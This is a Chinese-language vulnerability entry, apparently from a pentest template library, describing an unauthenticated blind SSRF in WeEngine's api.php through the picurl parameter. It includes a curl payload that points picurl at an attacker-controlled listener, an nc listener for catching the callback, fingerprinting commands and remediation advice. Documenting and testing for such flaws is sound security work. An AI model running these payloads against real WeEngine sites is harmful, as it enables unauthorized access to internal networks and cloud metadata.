---
id: WEENGINE-API-PHP-SSRF
title: 微擎前台 api.php 无回显 SSRF 漏洞（picurl 参数）
product: weengine
vendor: 微擎（WeEngine）
version_affected: "微擎（WeEngine）最新版（2021 年披露版本，api.php 前台入口）"
severity: HIGH
tags: [ssrf, 前台, 无需认证, 国产, 微信]
fingerprint: ["微擎", "weengine", "WeEngine", "api.php", "picurl"]
---

## 漏洞描述

微擎（WeEngine）前台 `api.php` 存在无回显 SSRF 漏洞（奇安信攻防社区 2021-08 披露）。`analyzeImage` 函数将 `$message['picurl']` 直接传入 `ihttp_get` 发起请求，未做协议/地址过滤，攻击者可在前台构造请求让服务器访问内网地址或云元数据。该漏洞无回显，需通过外带（如 DNS/HTTP 监听）确认。

**注意**：本条目只覆盖微擎 api.php 无回显 SSRF；不要把其他微擎历史漏洞并入本条目。

## 影响版本

- 微擎（WeEngine），2021 年披露时最新版（api.php 前台入口）

## 前置条件

- 目标为部署微擎的站点
- 需具备前台入口可访问（部分场景需要登录公众号/小程序配置权限，按实际部署确认）

## 利用步骤

1. 确认目标为微擎（登录页/特征路径 api.php）
2. 构造 picurl 指向攻击者控制的地址（HTTP/DNS 监听）
3. 观察监听端收到来自目标服务器的请求

## Payload

```bash
# 在授权测试中，将 picurl 替换为你控制的监听地址
curl -s -X POST "http://target/api.php" \
  --data-urlencode "picurl=http://<你控制的地址>/probe"
# 或配合 DNSLog 观察解析记录
```

## 验证方法

```bash
# 仅限授权测试：在你控制的监听地址收到目标服务器请求即存在 SSRF
nc -lvnp 8888
# 触发 picurl 请求后观察回连
```

## 指纹确认

```bash
curl -s "http://target/" | grep -iE "微擎|weengine|WeEngine"
# 或探测 api.php 入口
curl -s -o /dev/null -w "%{http_code}" "http://target/api.php"
```

## 修复建议

1. 升级微擎至修复版本
2. 对 picurl 参数做协议白名单（仅 http/https）与内网/云元数据地址拦截
3. 限制服务器出网访问

## 参考

- 奇安信攻防社区: https://mdr.skyeye.qianxin.com/forum/share/179
